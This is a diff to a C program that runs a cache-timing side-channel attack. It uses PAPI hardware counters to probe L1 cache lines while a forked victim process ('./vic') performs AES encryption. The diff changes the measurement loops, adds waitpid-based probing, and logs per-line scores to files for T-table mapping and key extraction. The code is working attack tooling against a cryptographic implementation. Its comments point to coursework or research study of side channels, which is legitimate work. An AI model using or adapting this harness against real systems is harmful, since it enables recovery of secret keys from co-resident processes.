@@ -11,15 +11,11 @@
 #include <string.h>
 #include <time.h>
 
-
-#define N_MEAS_T 100  // original value: 200
-#define OUTTER_REP_T 200     //  number of times a measurement of a given L1 line is performed
-#define INNER_REP_T 150     //  number of times a measurement of a given L1 line is performed
-
-#define OUTTER_MIN 50             // outter loop iteration that starts to measure * NEW *
-#define N_MEAS 500
-#define OUTTER_REPETITIONS 250     //  number of times a measurement of a given L1 line is performed
-#define INNER_REPETITIONS 150     //  number of times a measurement of a given L1 line is performed
+#define WAIT_TIME 15
+#define N_MEAS_T 50                 // original value: 200
+#define INNER_REP_T 150             //  number of times a measurement of a given L1 line is performed
+#define N_MEAS 150
+#define INNER_REPETITIONS 350       //  number of times a measurement of a given L1 line is performed
 
 #define L1_LINES 64
 #define LOGICAL_CORE 3              //  logical core where this process will run on
@@ -54,17 +50,25 @@ int main(void) {
     register int min;
     register int i;
     register int ii;
-    register int iii;
+    // register int iii;
     char * args[5]; // should be char * const instead !!!
     int pid  = 0;
+    int status;
     char plaintext[16*(3+1)+1];
     char plaintext2[16*(3+1)+1];
     long final_score[L1_LINES] = {0};
-    long final_score2[L1_LINES] = {0};
+
+
+
 
     printf("### T-Box Mapping Info Extraction\n");
 
     for(int j = 0; j < N_MEAS_T ; j++){
+
+        for(int l = 0;  l<L1_LINES; l++){
+            final_score[l] = 0;
+        }
+
 
         if(j%2 == 0){
             get_plaintexts_t(plaintext,plaintext2,j,0,16);
@@ -82,10 +86,9 @@ int main(void) {
         if ( (pid = fork())== 0) 
             execv("./vic", args);
 
-        // usleep(WAIT_TIME_T);
+        usleep(WAIT_TIME);
 
-
-        for (iii = 0; iii < OUTTER_REP_T; iii++) {
+        while(!waitpid(pid, &status, WNOHANG)){      
     
             for ( min=0; min<SIZE32KB/W; min+=C_BLOCK_SIZE) {
 
@@ -106,33 +109,25 @@ int main(void) {
                 if (PAPI_stop(EventSet, values) != PAPI_OK)
                     handle_error(1,"stop");
 
-                if(j%2==0){
-                    final_score[min/C_BLOCK_SIZE]+= values[0];
-                }
-                if(j%2==1){
-                    final_score2[min/C_BLOCK_SIZE]+= values[0];
-                }         
+
+                final_score[min/C_BLOCK_SIZE]+= values[0];
             }
+
+            
         }
 
-        wait(NULL);
+        snprintf(file_name, sizeof(file_name), "side_channel_info/table#%i.out",j);
+        logfile = fopen(file_name,"w");
+        for(int i = 0; i < L1_LINES; i++){
+            fprintf(logfile,"%ld\n", final_score[i]);
+        }
+        fclose(logfile);
+
 
     }
-
-    logfile = fopen("side_channel_info/table.out","w");
-    for(int i = 0; i<L1_LINES; i++){
-        fprintf(logfile,"%ld\n", (final_score2[i] - final_score[i]) /N_MEAS);
-    }
-    fclose(logfile);
-    
 
 
     printf("### Side Channel Information Extraction !\n"); // this print is required (check book)
-
-    // When attacking .so files in /tmp folder
-    // The interval around 50-300 OUTTER loop iterations
-    // intersects the time vic.c ciphering
-
 
     // Measurement loop
     for(int j = 0; j < N_MEAS ; j++){    
@@ -140,7 +135,6 @@ int main(void) {
         // resets the score structures
         for(int l = 0;  l<L1_LINES; l++){
             final_score[l] = 0;
-            final_score2[l] = 0;
         }
 
         get_p(plaintext);
@@ -153,12 +147,12 @@ int main(void) {
             execv("./vic", args);
         }
 
-        // usleep(WAIT_TIME);
+        usleep(WAIT_TIME);
 
 
-        for (iii = 0; iii < OUTTER_REPETITIONS; iii++) {
+        while(!waitpid(pid, &status, WNOHANG)){
 
-            for ( min=0 ; min<STRIDE ; min+=C_BLOCK_SIZE) {
+            for ( min=0 ; min < STRIDE; min+=C_BLOCK_SIZE) {
                 
                 if (PAPI_reset(EventSet) != PAPI_OK)
                     handle_error(1,"reset");
@@ -176,16 +170,7 @@ int main(void) {
                 if (PAPI_stop(EventSet, values) != PAPI_OK)
                     handle_error(1,"stop");
 
-                // This is needed since we are attacking
-                // .so file from /tmp directory
-                // somehow it takes more time to execute that code
-                // than it would require if it was compiled
-                // along with the victim
-                if( iii > OUTTER_MIN) {
-                    final_score[min/C_BLOCK_SIZE] += values[0];
-                }
-                
-
+                final_score[min/C_BLOCK_SIZE] += values[0];
             }
         }
 
@@ -194,12 +179,11 @@ int main(void) {
         logfile = fopen(file_name, "w");
         fprintf(logfile,"%s\n", plaintext);
         for ( min=0 ; min<STRIDE ; min+=C_BLOCK_SIZE) 
-            fprintf(logfile,"%ld\n", final_score[min/C_BLOCK_SIZE]/OUTTER_REPETITIONS);
+            fprintf(logfile,"%ld\n", final_score[min/C_BLOCK_SIZE]);
         fclose(logfile);
 
-
-        wait(NULL);// or kill(child_pid, SIGKILL);
     }
+
 
     return 0;
 
